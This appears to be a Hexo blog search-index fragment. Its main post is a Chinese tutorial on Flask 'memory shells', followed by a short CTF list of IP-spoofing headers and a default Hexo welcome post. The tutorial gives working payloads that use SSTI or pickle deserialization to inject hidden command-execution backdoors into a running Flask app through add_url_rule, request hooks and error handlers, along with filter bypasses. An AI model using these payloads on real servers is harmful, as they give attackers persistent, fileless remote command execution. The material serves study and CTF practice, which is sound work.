        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>内存马</strong>，也被称为<strong>无文件马</strong>，是无文件攻击的一种常用手段。</p><p>常用的python框架有<code>Django</code>、<code>flask</code>，而这两种框架都可能存在SSTI漏洞<strong>。<code>python 内存马</code><strong>就是利用flask框架中</strong>SSTI</strong>或者<strong>pickle反序列化</strong>来实现的，通过添加新的路由访问该路由实现命令执行。</p><h1 id="请求上下文管理机制"><a href="#请求上下文管理机制" class="headerlink" title="请求上下文管理机制"></a>请求上下文管理机制</h1><p>当网页请求进入flask时，会实例化一个<code>requset context</code>.在python中分出了两种上下文：<strong>请求上下文(request context)、应用上下文(session context).<strong>一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个stack的栈结构，也就是说它拥有一个栈所拥有的全部特性</strong>。<code>request context</code>实例化后会被push到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</strong> </p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用flask编写一个SSTI例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始flask内存马payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>下面我们将Payload拆开来, 逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>前面的<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>中，<code>url_for</code>是flask的一个方法，可以调用<code>__globals__</code>属性，**<code>__globals__</code>能返回函数所在模块命名空间的所有变量<strong>，其中包括很多已经引用的模块，而这里是有<code>__builtins__</code>的，而</strong><code>__builtins__</code>中包含很多内建函数**，其中包括命令执行函数<code>eval()</code>。即这一步主要是为了获取命令执行函数<code>eval()</code>，当然采用SSTI其他payload获取该函数也是可以的</p><p>而后面的<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>用于动态注册一个新的路由规则。</p><p>在flask中我们通常使用**<code>@app.route()</code><strong>装饰器来添加路由，而其也是调用了<code>add_url_rule</code>函数来添加路由的。</strong><code>app.add_url_rule</code>** 提供了更为底层和灵活的方式来定义路由，尤其适合在动态或程序化场景下使用。</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.png"></p><blockquote><ul><li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li><li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li><li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li><li>provide_automatic_options: 控制是否应自动添加选项方法.</li><li>options: 要转发到基础规则对象的选项.</li></ul></blockquote><p>而这里<code>&#39;/shell&#39;</code>指路由的路径。<code>shell</code>是路由规则的名称，它是这个路由的标识符，可以在其他地方引用。**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>则是该路由对应的函数，这里定义的一个匿名函数<code>lambda</code>，用于执行命令，</strong>通过<code>_request_ctx_stack.top</code>指向请求上下文栈的顶部元素，即当前正在处理的请求，再通过<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>获取请求中cmd参数的值，默认为<code>whoami</code>，通过<code>read()</code>标准输出，从而达到添加路由做到任意命令执行**</p><p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>。 <strong><code>_request_ctx_stack</code><strong>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。</strong><code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</strong>这里指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到。</p><blockquote><p>这里app的获取也可以通过**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p></blockquote><h1 id="add-url-rule的局限"><a href="#add-url-rule的局限" class="headerlink" title="add_url_rule的局限"></a>add_url_rule的局限</h1><p>上面的payload只针对旧版，但由于新版关闭debug模式会调用check函数，即<code>_check_setup_finished()</code>函数引起报错</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>意思就是这个app已经跑起来了,这个函数就不能再被调用了.调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次,所以基本上是完全不能用了.</p><p>所以旧版不能用的大致原因是因为在可以动态添加路由和错误处理逻辑(如<code>register_error_handler()</code>方法)都被**<code>@setupmethod</code>装饰器修饰<strong>了,而<code>@setupmethod</code>装饰器会在Flask跑起来之前就把这些方法都加到一个被check的名单里,以后</strong>再被调用的话就会被<code>@setupmethod</code>这个装饰器给check然后报错**</p><p>所以add_url_rule就不能用了，这里就需要其他方法挂内存🐎</p><h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>python装饰器：装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数,并返回一个新的函数或类.这个新的函数或类通常会保留原始函数或类的功能,但会在其基础上添加一些额外的逻辑.</strong></p><p>在flask中，**<code>before_request</code>是一个装饰器，它用于在请求处理之前执行特定的函数**。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p><p>举个例子：<br><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/3.png"></p><p>这里验证请求头是否包含<code>Authorization</code>字段，如果没有，则返回未授权的错误响应(401)</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/4.png"></p><p>可以看到<code>before_request</code>实际上调用的是**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**，其意思是：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li><strong>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</strong></li></ul><p>这个函数f就是我们要添加的函数。</p><p>而该函数就添加之前payload的lambda匿名函数即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>与<code>before_request</code>类似。<code>after_request</code>方法允许我们在每个请求之后执行一些操作。我们可以利用该方法来添加一些响应头、记录请求日志等任务</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/5.png"></p><p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><p>逐行解释这段代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #定义一个全局变量,方便获取</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和r变量名都是可以改的</span></span><br></pre></td></tr></table></figure><p>不带出回显，适用于过滤严格的场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure><h1 id="Flask中的其他钩子函数"><a href="#Flask中的其他钩子函数" class="headerlink" title="Flask中的其他钩子函数"></a>Flask中的其他钩子函数</h1><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数.钩子函数是指在执行函数和目标函数之间挂载的函数,框架开发者给调用方提供一个point-挂载点,至于挂载什么函数由调用方决定.</p><p><strong>@before_first_request</strong></p><p>在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次.</p><p><strong>@before_request</strong></p><p>在每个请求之前注册一个要运行的函数,每一次请求都会执行一次.</p><p><strong>@after_request</strong></p><p>在每个请求之后注册一个要运行的函数,每次请求完成后都会执行.需要接收一个 Response 对象作为参数,并返回一个新的 Response 对象,或者返回接收的 Response 对象.</p><p><strong>@teardown_request</strong></p><p>注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行.</p><p><strong>@context_processor</strong></p><p>上下文处理器,返回的字典可以在全部的模板中使用.</p><p><strong>@template_filter(‘upper’)</strong></p><p>增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.</p><p><strong>@errorhandler(400)</strong></p><p>发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.</p><p>1.发生请求错误时,框架会自动调用相应的钩子函数,并向钩子函数中传入error参数.</p><p>2.如果钩子函数没有定义error参数,就会报错.</p><p>3.可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常,如果要是发生参数错误,可以abort(404)之类的.</p><p><strong>@teardown_appcontext</strong></p><p>不管是否有异常,注册的函数都会在每次请求之后执行.flask 为上下文提供了一个<code>teardown_appcontext</code>钩子,使用它注册的毁掉函数会在程序上下文被销毁时调用,通常也在请求上下文被销毁时调用.某些情况下这个函数和**@teardown_request**的行为是类似的,一个是请求上下文被销毁时被调用,另一个是应用上下文被销毁时调用.</p><p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数,当请求被正常处理时这个参数将是None,这个函数的返回值将被忽略.</p><h2 id="before-request-after-request和-teardown-request-teardown-appcontext的区别"><a href="#before-request-after-request和-teardown-request-teardown-appcontext的区别" class="headerlink" title="@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别"></a>@before_request&#x2F;@after_request和@teardown_request&#x2F;@teardown_appcontext的区别</h2><p><strong>@after_request</strong>是在视图函数处理完请求并生成响应对象之后，但在响应被发送给客户端之前。而且这个函数需要接收当前的响应作为参数,并可以返回一个新的响应对象或者返回原来的响应对象.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>无论请求是否成功完成，无论是否发生了异常,是在响应已经被发送给客户端之后被触发,而且不接受任何参数.</p><p><strong>@after_request</strong>装饰的函数如果抛出了异常就会直接跳转到错误处理机制.</p><p><strong>@teardown_request&#x2F;@teardown_appcontext</strong>装饰的函数被抛出的异常通常会被忽略.</p><h2 id="teardown-request的利用"><a href="#teardown-request的利用" class="headerlink" title="@teardown_request的利用"></a>@teardown_request的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>**不能调用<code>request.args.get()</code>动态执行传入的命令,**但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.在这个时候上一个HTTP请求帧已经被销毁了,但是可以执行静态命令.</p><h2 id="teardown-appcontext的利用"><a href="#teardown-appcontext的利用" class="headerlink" title="@teardown_appcontext的利用"></a>@teardown_appcontext的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>同样<strong>不能调用<code>request.args.get()</code>动态执行传入的命令</strong>,但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.不然会报错</p><h2 id="errorhandler-的利用"><a href="#errorhandler-的利用" class="headerlink" title="@errorhandler()的利用"></a>@errorhandler()的利用</h2><p>该装饰器内部定义了一个用于注册错误处理函数的函数</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/6.png"></p><p>跟到这个<code>register_error_handler()</code>里边</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/7.png"></p><p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数,就是错误处理函数.</p><p>如果我们能控制<code>code</code>和<code>exc_class</code>,我们就可以利用错误处理的逻辑执行我们传入的函数.那么<code>code</code>和<code>exc_class</code>是从哪里来的呢,看656行的<code>self._get_exc_class_and_code</code>,进入这个方法可以发现他返回的是一个元组,元组里有一个错误的类和一个整数</p><p><img src="/2025/02/07/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/8.png"></p><p>这里直接调用<code>_get_exc_class_and_code()</code>这个方法然后把他的返回值扔到<code>self.error_hander_spec</code>这个字典里.然后给他赋值我们构造的函数.<code>_get_exc_class_and_code()</code>的形参是一个整数就比较方便调用了.</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个方法是可以直接带出回显的</p><h1 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a>pickle利用下的payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>这里参考SSTI的绕过</p><ul><li><strong><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></strong></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/news/10381">新版FLASK下python内存马的研究</a></li><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python 内存马分析</a></li><li><a href="https://xz.aliyun.com/news/13976">新版Flask框架下用钩子函数实现内存马的方式</a></li><li><a href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flask下的内存马</a></li><li><a href="https://asal1n.github.io/2024/10/18/python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E5%86%85%E5%AD%98%E9%A9%AC/index.html">一些python RCE利用&amp;&amp;内存马</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的IP伪造</title>
      <link href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<p>在一些CTF比赛常常会考到通过<strong>伪造IP</strong>获得flag，下面是一些常见的IP伪造的请求头：</p><ul><li><strong>X-Forwarded-For:127.0.0.1</strong></li><li><strong>Client-ip:127.0.0.1</strong></li><li><strong>X-Client-IP:127.0.0.1</strong></li><li><strong>X-Remote-IP:127.0.0.1</strong></li><li><strong>X-Rriginating-IP:127.0.0.1</strong></li><li><strong>X-Remote-addr:127.0.0.1</strong></li><li><strong>HTTP_CLIENT_IP:127.0.0.1</strong></li><li><strong>X-Real-IP:127.0.0.1</strong></li><li><strong>X-Originating-IP:127.0.0.1</strong></li><li><strong>via:127.0.0.1</strong></li><li><strong>X-Forwarded:127.0.0.1</strong></li><li><strong>X-Forwarded-Host:127.0.0.1</strong></li><li><strong>True-Client-IP:127.0.0.1</strong></li><li><strong>Ali-CDN-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Src-IP:127.0.0.1</strong></li><li><strong>CF-Connecting-IP:127.0.0.1</strong></li><li><strong>Proxy-Client-IP:127.0.0.1</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/01/31/hello-world/"/>
      <url>/2025/01/31/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
